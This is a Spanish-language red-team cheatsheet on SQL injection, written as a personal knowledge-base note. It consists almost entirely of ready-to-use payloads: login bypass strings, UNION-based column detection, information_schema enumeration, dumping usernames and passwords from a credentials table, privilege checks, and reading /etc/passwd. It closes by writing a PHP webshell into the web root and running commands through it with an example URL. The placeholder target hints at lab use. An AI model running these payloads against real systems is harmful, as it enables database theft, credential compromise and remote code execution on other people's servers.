---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
tertiary categories:
  - "[[Web Explotación]]"
type: CheatSheet
linked:
  - "[[SQL Commands]]"
  - "[[Union-based SQLi]]"
  - "[[SQLi Enumeration]]"
  - "[[MySQL Read & Write]]"
  - "[[SQLi to RCE]]"
---
# SQL Injection (SQLi)

***

## Cheatsheet

### 1. Auth Bypass (Acceso Inicial)

_Payloads para saltarse formularios de login._
```SQL
admin' or '1'='1       -- Bypass básico
admin')-- -            -- Bypass con cierre de paréntesis y comentario
```

### 2. Reconocimiento y Estructura (Union-Based Setup)

_Determinar la cantidad de columnas para poder usar `UNION SELECT`._
```SQL
' order by 1-- -       -- Detectar columnas incrementando el número (1, 2, 3...)
cn' UNION select 1,2,3-- -  -- Validar inyección Union (si hay 3 columnas)
```

### 3. Enumeración de Base de Datos

_Una vez confirmada la inyección Union, extraer información del sistema._
```SQL
-- Versión y Fingerprinting
SELECT @@version       -- Versión de la DB (en output)
SELECT SLEEP(5)        -- Fingerprint basado en tiempo (Blind)

-- Base de datos actual
cn' UNION select 1,database(),2,3-- -
```

### 4. Enumeración de Esquema (Information_Schema)

_Mapeo completo de la base de datos._
```SQL
-- Listar TODAS las bases de datos
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Listar TABLAS de una base de datos específica ('dev')
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- Listar COLUMNAS de una tabla específica ('credentials')
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- Dumpear DATOS (Extraer usuarios y passwords)
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

### 5. Privilegios del Usuario

_¿Qué permisos tiene el usuario con el que corre la DB?_
```SQL
-- Usuario actual
cn' UNION SELECT 1, user(), 3, 4-- -

-- Verificar si es Super Admin (root)
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- Listar todos los privilegios
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Verificar permisos de archivos (importante para LFI/RCE)
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### 6. SQLi to RCE (File I/O)

_Escalada crítica: Leer archivos del sistema o escribir webshells._

**LFI (Local File Inclusion / Lectura):**
```SQL
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**File Write (Escritura de Archivos):**
```SQL
-- Prueba de escritura simple
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

-- RCE: Escribir una Webshell PHP
cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.php'-- -
# http://STMIP:STMPO/shell.php?0=cat%20../etc/passwd
```

***

## Overview


***

## Notas Relacionadas


***

/etc/nginx//sites-enabled/default
 /etc/apache2/sites-enabled/000-default.conf